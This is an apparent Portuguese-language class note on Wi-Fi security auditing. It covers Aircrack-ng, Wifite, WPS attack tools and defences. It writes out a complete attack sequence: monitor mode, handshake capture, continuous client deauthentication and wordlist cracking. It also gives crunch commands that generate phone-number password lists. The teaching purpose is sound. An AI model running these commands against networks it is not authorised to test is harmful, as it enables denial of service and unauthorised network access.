---
tipo: aula
resumo: "Ferramentas e técnicas para auditoria de segurança em redes Wi-Fi, incluindo Aircrack-ng, Wifite e ataques comuns."
tags:
  - aula
  - seguranca-da-informacao
  - wifi
  - aircrack-ng
  - redes-sem-fio
  - pentest
---

# Ferramentas de Redes Sem Fio (802.11)

> [!quote] Testando a Segurança Wi-Fi
> *As mesmas ferramentas usadas por atacantes podem ser usadas para defender suas redes.*

> [!tip] Pré-requisito
> Consulte [[Fundamentos e conceitos de Redes Sem Fio]] para entender a teoria.

---

## 💻 Comandos Básicos de Rede

### Linux

```bash
ifconfig          # Visualiza e configura interfaces
iwconfig          # Configuração de interfaces wireless
ip addr           # Visualiza endereços IP
iw dev            # Lista dispositivos wireless
```

### Windows

```cmd
ipconfig                          # Visualiza configurações de rede
netsh wlan show interfaces        # Visualiza interfaces Wi-Fi
netsh wlan show profiles          # Lista redes salvas
```

---

## 🛠️ Ferramentas Essenciais

> [!success] Arsenal para Auditoria Wi-Fi

| Ferramenta | Descrição |
|------------|-----------|
| **Aircrack-ng** | Suíte completa para auditoria Wi-Fi (mais utilizada no mundo) |
| **Wifite** | Script Python para ataques automatizados |
| **Airgeddon** | Ataques automatizados de Evil Twin |
| **Kismet** | Auditoria e detecção de intrusão (WIDS) |
| **Wash** | Escaneia roteadores com WPS ativado |
| **Reaver** | Explora vulnerabilidades do WPS |
| **Bully** | Implementação melhorada do Reaver |
| **Cowpatty** | Força bruta em senhas Wi-Fi |
| **Pyrit** | Quebra de senhas usando GPU |
| **Crunch** | Gerador de wordlists |

---

## ⚡ Wifite

> [!tip] Automatização Simples
> Ferramenta automatizada que simplifica ataques em redes Wi-Fi.

```bash
# Uso básico (seguir menu interativo)
wifite

# Escanear apenas redes com WPS
sudo wifite --wps-only --random-mac --skip-crack --power 35
```

Utilize `wifite --help` ou `man wifite` para mais opções.

---

## 🔧 Suíte Aircrack-ng

> [!warning] Executar como root
> Todos os comandos devem ser executados com privilégios de administrador.

### Comandos Principais

| Comando | Função |
|---------|--------|
| `airmon-ng` | Gerencia modo monitor |
| `airodump-ng` | Captura pacotes e lista redes |
| `aireplay-ng` | Injeção de pacotes |
| `aircrack-ng` | Quebra de senhas |

### Fluxo de Ataque Completo

```bash
# 1. Ativar modo monitor
airmon-ng start wlan0

# 2. Visualizar redes próximas
airodump-ng wlan0mon

# 3. Definir canal do alvo
iwconfig wlan0mon channel 10

# 4. Capturar handshake do alvo específico
airodump-ng wlan0mon --bssid 00:1A:3F:8D:57:42 -w captura -c 8

# 5. Desautenticar clientes (em outro terminal)
aireplay-ng -0 0 -a 00:1A:3F:8D:57:42 wlan0mon

# 6. Quebrar senha com wordlist
aircrack-ng captura-01.cap -w /usr/share/wordlists/rockyou.txt
```

[🔗 Aircrack-ng - Site Oficial](https://www.aircrack-ng.org/)

---

## 📝 Wordlists

> [!info] Listas de Senhas para Força Bruta

### Wordlists Comuns

- **rockyou.txt** — Lista clássica com milhões de senhas vazadas
- **Localização no Kali**: `/usr/share/wordlists/rockyou.txt.gz`

### Gerando Wordlists Personalizadas

```bash
# Números de celular (998XXXXXX)
crunch 9 9 0123456789 -t 998@@@@@@ -o celulares998.txt

# Números de celular (999XXXXXX)
crunch 9 9 0123456789 -t 999@@@@@@ -o celulares999.txt

# Com DDD
crunch 11 11 0123456789 -t 22998@@@@@@ -o celulares22998.txt

# Todos os números de 8 dígitos
crunch 8 8 0123456789 -o numeros8.txt

# Juntar arquivos
cat celulares* > celulares.txt
```

---

## ⚔️ Ataques Comuns e Medidas

> [!warning] Ataques e Defesas

| Ataque | Descrição | Medida Defensiva |
|--------|-----------|------------------|
| **DoS (Deauth)** | Derrubar redes ou clientes | Monitoramento com WIDS |
| **Ataque WPS** | Explorar protocolo WPS | **Desabilitar WPS** |
| **Força Bruta** | Quebrar senha por tentativa | Senhas longas e complexas |
| **Evil Twin** | Roteador falso para roubar credenciais | Verificar certificados, usar VPN |

---

## 🎯 Roteiro de Aula Prática

> [!success] Passo a Passo

1. ☐ Conectar placa Wi-Fi na porta USB do computador
2. ☐ Abrir a máquina virtual Kali Linux
3. ☐ Menu: Dispositivos > USB > Atheros
4. ☐ Verificar interface com `ifconfig` (procurar wlan0)
5. ☐ Se houver problemas, reconectar placa e reiniciar Kali
6. ☐ Seguir tutorial do Aircrack-ng ou Wifite
7. ☐ Realizar ataques em ambiente controlado

---

## 🔍 Outras Ferramentas

| Ferramenta | Uso |
|------------|-----|
| **Karma** | Ataque Evil Twin via PNL (Preferred Network List) |
| **Beholder** | Anti-karma, detecta anomalias em redes Wi-Fi |
| **mdk3/mdk4** | Ataques de deauthentication em massa |
| **Linset** | Evil Twin automatizado |

